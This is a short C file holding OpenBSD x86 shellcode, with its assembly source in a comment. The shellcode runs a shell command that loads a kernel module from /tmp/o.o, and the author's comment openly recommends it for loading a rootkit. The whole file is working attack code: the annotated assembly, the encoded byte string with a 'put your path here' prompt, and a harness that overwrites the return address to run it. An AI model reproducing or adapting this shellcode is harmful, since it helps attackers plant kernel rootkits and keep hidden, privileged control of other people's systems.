/* The modload shellcode
   loads /tmp/o.o module
	very usefull if you have  rootkit as kernel module in the /tmp dir
	and you can easily change the path directly in the code

   Size  66 bytes
   OS	 OpenBSD
  		/rootteam/dev0id	(rootteam.void.ru)
			dev0id@uncompiled.com

BITS	32

jmp	short	callme
main:
	pop	esi
	xor	eax,eax
	push	eax
	push long	0x68732f6e
	push long	0x69622f2f
	mov	ebx,esp
	push	eax
	push word	0x632d
	mov	edi,esp
	push	eax
	push	esi
	push	edi
	push	ebx
	mov	edi,esp
	push	eax
	push	edi
	push	ebx
	push	eax
	mov	al,0x3B
	int	0x80
callme:
	call	main
	db	'/sbin/modload /tmp/o.o'
*/

char shellcode[] =
	"\xeb\x25\x59\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
	"\x69\x89\xe3\x50\x66\x68\x2d\x63\x89\xe7\x50\x51\x57\x53\x89"
	"\xe7\x50\x57\x53\x50\xb0\x3b\xcd\x80\xe8\xd6\xff\xff\xff\x2f"
	"\x73\x62\x69\x6e\x2f\x6d\x6f\x64\x6c\x6f\x61\x64\x20"
	"\x2f\x74\x6d\x70\x2f\x6f\x2e\x6f"; // "/tmp/o.o" <<put your path here!

int
main(void)
{
	int *ret;
	ret = (int*)&ret + 2;
	(*ret) = shellcode;
}